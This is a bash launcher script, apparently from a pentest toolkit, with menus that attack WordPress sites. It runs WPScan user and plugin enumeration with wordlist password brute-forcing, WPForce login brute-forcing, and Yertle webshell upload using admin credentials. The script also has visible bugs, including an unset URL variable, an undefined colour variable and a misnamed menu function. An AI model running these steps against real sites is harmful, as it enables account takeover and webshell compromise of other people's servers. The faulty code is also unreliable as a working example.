#!/usr/bin/env bash
ORNG='\033[0;33m'
NC='\033[0m'
W='\033[1;37m'
LP='\033[1;35m'
YLW='\033[1;33m'
LBBLUE='\e[104m'
cd /opt/WPForce
if [[ ! -f '.wp_api' ]]; then
	sudo touch /opt/WPForce/.wp_api
	sudo chown $USER:$USER /opt/WPForce/.wp_api
	echo -e "${W}Please enter your WPvulnDB api now: ${NC}"
	read WPAPI
	sudo echo ${WPAPI} >> /opt/WPForce/.wp_api
fi
WP_API=$(cat /opt/WPForce/.wp_api)

wpforce(){
	echo -e "${RED}"
	figlet -f mini WPForce
	echo -e "${NC}"
	echo -e "${W}Please enter the full path/to/users.txt file for brutforcing${NC}"
	read USERS
	echo -e "${W}Please enter the full /path/to/passlist.txt file for brutforcing${NC}"
	read PASSL
	echo -e "${W}Please enter the target URL with webmask(http:// - https://)${NC}"
	read TARGET 
	sudo python wpforce.py -i ${USERS} -w ${PASSL} -u "${URL}" -v -t 8
}
yertle(){
	echo -e "${RED}"
	figlet -f mini Yertle
	echo -e "${NC}"
	echo -e "${W}Please enter the username to use for webshell upload(preferably admin)${NC}"
	read USER
	echo -e "${W}Please enter the password to use for webshell upload"
	read PASS
	echo -e "${W}Please enter the target URL"
	read TARGET
	sudo python yertle.py -u "${USER}" -p "${PASS}" -t "${TARGET}" -i
}
wpscan(){
	if [[ ! -d '/opt/sifter/results/WPScan' ]]; then
		mkdir /opt/sifter/results/WPScan
	fi
	echo -e "${RED}"
	figlet -f mini "WPscan"
	echo -e "${YLW}"
	cat /opt/sifter/files/pingtest.pass
	echo -e "${NC}"
	echo -e "${W}Please copy and paste in your target site${NC}"
	read TARGET
	echo "==================================================================================="
	sudo wpscan --url http://${TARGET} --wp-content-dir wp-content -e u vp vt dbe --random-user-agent --ignore-main-redirect --api-token ${WP_API} | tee /opt/sifter/results/WPScan/${TARGET}.txt
	LOG=$(cat /opt/sifter/results/WPScan/${TARGET}.txt | grep "ignore-main-redirect")
	if [[ ${LOG} == "ignore-main-redirect" ]]; then
		sudo wpscan --url https://${TARGET} --wp-content-dir wp-content -e u vp vt dbe --random-user-agent --ignore-main-redirect --api-token ${WP_API} | tee /opt/sifter/results/WPScan/${TARGET}.txt
	fi
	echo "==================================================================================="
	sleep 2

		echo -e "${W}Would you like WPScan to search for passwords of enumerated users (if any)${NC}"
		options=("Yes" "No")
		select opts in "${options[@]}"
		do
			case $opts in
				"Yes")
					echo "==================================================================================="
					echo -e "${W}Please enter the full /path/to/wordlist.txt${NC}"
						sleep 2
						read WORDLIST
						sleep 2
					if [[ ${LOG} == "ignore-main-redirect" ]]; then
						sudo wpscan --url https://${TARGET} --wp-content-dir wp-content -e u -P ${WORDLIST} --random-user-agent --api-token ${WP_API} | tee /opt/sifter/results/WPScan/${TARGET}.txt
					else
						sudo wpscan --url http://${TARGET} --wp-content-dir wp-content -e u -P ${WORDLIST} --random-user-agent --api-token ${WP_API} | tee /opt/sifter/results/WPScan/${TARGET}.txt
					fi
					echo "==================================================================================="
					sleep 1
					;;

				"No")
					cd /opt/sifter
					exit
					;;

			esac
		done
}
forestart(){
	echo -e "${W}Would you like to use ${RED}(W)PForce ${W}for brutforcing or ${RED}(Y)ertle ${W}for webshell upload${NC}"
	read ANS
	if [[ ${ANS} == "w" ]] || [[ ${ANS} == "W" ]]; then
		wpforce
	else
		yertle
	fi
}
echo -e "${RED}"
figlet -f mini "WordpresS"
echo -e "${NC}"
echo -e "${W}Which tool would you like to use?${NC}"
		options=("WPScan" "WPForce" "Back")
		select opts in "${options[@]}"
		do
			case $opts in
				"WPScan")
					wpscan
					;;
					
				"WPForce")
					forcestart
					;;

				"Back")
					exit
					;;
			esac
		done



##########################______________ VGhlIERlYWQgQnVubnkgQ2x1Yg== ______________##########################